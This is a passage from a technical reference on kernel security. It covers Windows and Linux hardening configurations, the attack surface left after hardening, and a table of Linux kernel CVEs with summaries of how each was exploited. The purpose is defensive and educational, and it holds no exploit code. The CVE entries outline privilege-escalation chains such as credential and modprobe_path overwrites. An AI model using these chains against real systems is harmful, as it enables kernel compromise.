These hardening layers are cumulative. A production deployment should enable all applicable options; each addresses a specific technique in the attacker's toolkit. `CONFIG_STATIC_USERMODEHELPER` is particularly load-bearing: it prevents `modprobe_path` overwrite (section 8.4) from producing code execution, because the helper binary path is compiled in rather than read from a writable global variable.

### 12.2 Windows hardened configuration

A fully hardened Windows 11 deployment includes:

VBS + HVCI + Kernel CET (IBT + SHSTK) + Credential Guard + KDP + Secure Boot + PatchGuard + HyperGuard + Windows Defender Exploit Guard.

Residual attack surface: the attacker is restricted to data-only attacks (no code-pointer corruption due to CET, no unsigned code execution due to HVCI). Token stealing (§10.1) remains viable against kernel write primitives. VBS/hypervisor bypass is theoretically possible but requires high-value, rare vulnerabilities.

Additional hardening: enable the Vulnerable Driver Block List (Microsoft-maintained, updated via Windows Update, also configurable via WDAC policies) to prevent known BYOVD vectors. Deploy Windows Defender Application Control (WDAC) in audit-then-enforce mode to restrict which signed drivers can load — HVCI verifies code is signed but does not restrict which signed code can load, while WDAC adds an allowlisting layer. Enable Attack Surface Reduction (ASR) rules for credential theft prevention (blocking LSASS process creation from untrusted paths, blocking direct memory access to LSASS). Set the `ProcessMitigationPolicy` for sensitive processes to enable arbitrary code guard (ACG), which prevents dynamic code generation — combined with CET, this closes both static (ROP) and dynamic (JIT shellcode) code-execution paths. Configure kernel address space layout randomization with `bcdedit /set {current} highentropy on` (enabled by default on recent builds, but verify). For domain controllers and high-value servers, deploy Microsoft's "Secured-Core" configuration, which mandates VBS + HVCI + System Guard + DMA protection, providing the full mitigation stack against both software and physical kernel compromise vectors.

### 12.3 The asymptotic defense and residual attack surface

As kernel mitigations accumulate, the exploitation effort curve is asymptotic: each new mitigation raises the effort required, but the marginal difficulty increase diminishes because the remaining attack surface (data-only, logic bugs, page-cache corruption) is fundamentally harder to defend against with the same class of mitigations (memory safety, control-flow integrity).

The residual attack surface falls into three categories. First, logic bugs like Dirty Pipe (§8.5) exploit correct-but-unintended interactions between kernel subsystems. No memory-safety mitigation detects these because no memory safety violation occurs. Second, data-only attacks (§6.2, §8.4, §10.1) modify kernel data structures without corrupting code pointers, bypassing all CFI mechanisms. Third, physical-page-level manipulation (§8.7, CVE-2024-1086) operates below the virtual-memory abstraction layer, making KASLR, SMEP, SMAP, and KPTI all irrelevant.

The next frontier — data-flow integrity (DFI), capability-based memory models, and language-level memory safety in the kernel (Rust in Linux) — addresses this residual surface. DFI tracks the intended data flow of every variable and detects deviations (a `cred` pointer being modified outside of `commit_creds` would violate DFI), but the performance overhead (10–50% in prototype implementations) currently limits deployment. Rust in Linux eliminates entire vulnerability classes (UAF, buffer overflow, uninitialized reads) in new kernel code, but retrofitting existing C code is a decades-long effort. In the interim, defense depends on reducing the kernel's attack surface (unprivileged BPF disabled, user namespace restrictions, seccomp on all services, minimal module set) and deploying runtime integrity monitoring (LKRG, eBPF-based credential monitoring, crash-dump triage automation) to detect exploitation attempts that bypass preventive controls.

---

## 13. Kernel exploitation CVE reference table

The following table collects representative CVEs that exemplify the vulnerability classes, bypass techniques, and exploitation primitives discussed throughout this chapter. Each entry identifies the affected component, the exploitation technique that the CVE enabled or demonstrated, and its patch status in the mainline kernel or vendor release.

| CVE | Year | Vulnerability Class | Affected Component | CVSS 3.1 | Exploitation Technique | Patch Status |
|-----|------|--------------------|--------------------|-----------|----------------------|--------------|
| CVE-2017-5754 (Meltdown) | 2017 | Speculative execution / information leak | CPU (Intel, some ARM) | 5.6 | Speculative read of kernel memory from user space; defeated KASLR and leaked arbitrary kernel data | Mitigated by KPTI (Linux 4.15+), microcode updates |
| CVE-2017-18344 | 2017 | Information leak (uninitialized stack) | `timer_getoverrun` syscall | 5.5 | Leaked kernel stack data including code pointers; used as KASLR bypass primitive | Patched in Linux 4.14.67, 4.18.5 |
| CVE-2020-28588 | 2020 | Information leak (stack buffer) | Netlink `nla_strlcpy` | 5.5 | Leaked kernel stack pointers via netlink messages; reliable KASLR defeat for any netlink user | Patched in Linux 5.10-rc1 |
| CVE-2021-3490 | 2021 | eBPF verifier bypass (ALU32 bounds) | eBPF subsystem | 7.8 | Out-of-bounds read/write via eBPF; KASLR bypass + arbitrary kernel read/write | Patched in Linux 5.12.4 |
| CVE-2021-4154 | 2021 | Use-after-free | cgroup `fsconfig` | 8.8 | UAF → cross-cache → cred overwrite; container escape from unprivileged user namespace | Patched in Linux 5.16-rc4 |
| CVE-2022-0185 | 2022 | Heap overflow | `legacy_parse_param` (VFS) | 8.4 | Heap overflow → info leak → arbitrary write → `modprobe_path` overwrite; container escape | Patched in Linux 5.16.2 |
| CVE-2022-0847 (Dirty Pipe) | 2022 | Logic bug (flag not cleared) | Pipe / splice / page cache | 7.8 | Arbitrary overwrite of read-only file content via page-cache corruption; no memory corruption needed | Patched in Linux 5.16.11, 5.15.25 |
| CVE-2022-4543 (EntryBleed) | 2022 | Side-channel (TLB timing) | CPU (Intel) / syscall entry | 5.5 | TLB residual after `SYSCALL` reveals kernel text base; KASLR bypass in <1 second | Patched in Linux 6.2 (TLB flush on exit) |
| CVE-2022-23222 | 2022 | eBPF verifier bypass (pointer arithmetic) | eBPF subsystem | 7.8 | Bounds confusion → arbitrary read/write from eBPF program → full kernel compromise | Patched in Linux 5.16.2 |
| CVE-2023-2163 | 2023 | eBPF verifier bypass (precision tracking) | eBPF subsystem | 7.8 | Verifier precision tracking flaw → out-of-bounds access → KASLR bypass + arbitrary write | Patched in Linux 6.3.2 |
| CVE-2023-32233 | 2023 | Use-after-free | Netfilter nf_tables | 7.8 | UAF → cross-cache `msg_msg` reclaim → OOB read/write → `modprobe_path` overwrite | Patched in Linux 6.3.2, 6.2.16 |
| CVE-2024-0582 | 2024 | Use-after-free | io_uring (buffer ring) | 7.8 | UAF on registered buffer pages → physmap page-table manipulation → arbitrary R/W | Patched in Linux 6.7-rc1 |
| CVE-2024-1086 | 2024 | Double-free | Netfilter nf_tables verdict | 7.8 | Double-free → page-level PTE manipulation → physical memory R/W → cred overwrite; ~100% reliability | Patched in Linux 6.7.2, 6.6.15 |
| CVE-2024-26581 | 2024 | Integer overflow | Netfilter nftables (`nft_set_rbtree`) | 7.8 | OOB write via rbtree gc race → cross-cache → privilege escalation | Patched in Linux 6.8-rc2 |

The table illustrates several trends in kernel exploitation research. First, the Netfilter/nf_tables subsystem has been a persistent source of high-severity vulnerabilities (CVE-2023-32233, CVE-2024-1086, CVE-2024-26581), prompting distributions to restrict unprivileged access to nftables via user namespace controls. Second, eBPF verifier bypasses (CVE-2021-3490, CVE-2022-23222, CVE-2023-2163) consistently provide powerful primitives because a verifier flaw grants the attacker a kernel-context program with arbitrary memory access. Third, the progression from control-flow hijack (older CVEs) to data-only and page-level attacks (CVE-2024-1086) reflects the increasing difficulty imposed by SMEP, SMAP, KPTI, and Kernel CET.

---

## 14. Cross-references

**To Domain 4B (hardware-enforced CFI in kernel):** kernel CET IBT (§9.5 here; Domain 4B §1.4) constrains kernel-mode indirect branches. Kernel PAC on AArch64 (Domain 4B §4.5) protects kernel return addresses. The data-only attacks described in this chapter (§6.2, §8.4, §10.1) are specifically designed to bypass these control-flow defenses.

**To Domain 5 (kernel exploitation techniques):** the SLUB heap spray, cross-cache attacks (§8.2), elastic objects (§8.3), and exploitation primitives described in this chapter build on Domain 5's coverage of kernel heap internals and subsystem attack surfaces. `modprobe_path` (§8.4) and `pipe_buffer` exploitation (§8.3) are detailed in Domain 5's exploitation primitives.

**To Domain 7 (speculative execution):** KASLR bypass via prefetch timing (§1.3), branch predictor state (§1.4), and EntryBleed (§1.2) rely on speculative execution and microarchitectural side-channel primitives described in Domain 7, Chapter 7A. KPTI (§4) was designed specifically to mitigate Meltdown (CVE-2017-5754), the speculative execution attack covered in Domain 7.

**To Domain 2 (process memory and OS primitives):** page-table structure and manipulation (§2.4 SMEP bypass, §3.3 physmap spray) reference the page-table mechanics from Domain 2, Chapter 2A. Seccomp bypass (§7) directly targets the seccomp enforcement mechanism described in Domain 2, Chapter 2B §3. Capability manipulation through `cred` modification (§6.2) interacts with the capabilities system from Domain 2, Chapter 2C.

**To Domain 3 (memory corruption primitives):** the initial corruption primitives (heap overflow, use-after-free, type confusion) that kick off the exploitation pipeline (§8.1) are the attack classes described in Domain 3. The heap manipulation techniques for exploit staging (§8.2, §8.3) build on the allocator internals from Domain 3, Chapter 3B.

**To Domain 27 (secure architecture and detection engineering):** the detection techniques in §11 (eBPF monitoring, LKRG, crash-dump analysis, HyperGuard) feed into the detection engineering pipeline described in Domain 27. Kernel exploit telemetry should be ingested by the SIEM/SOAR systems described in Domain 27, Chapter 27C, with automated alert workflows for credential manipulation events and PatchGuard violations.
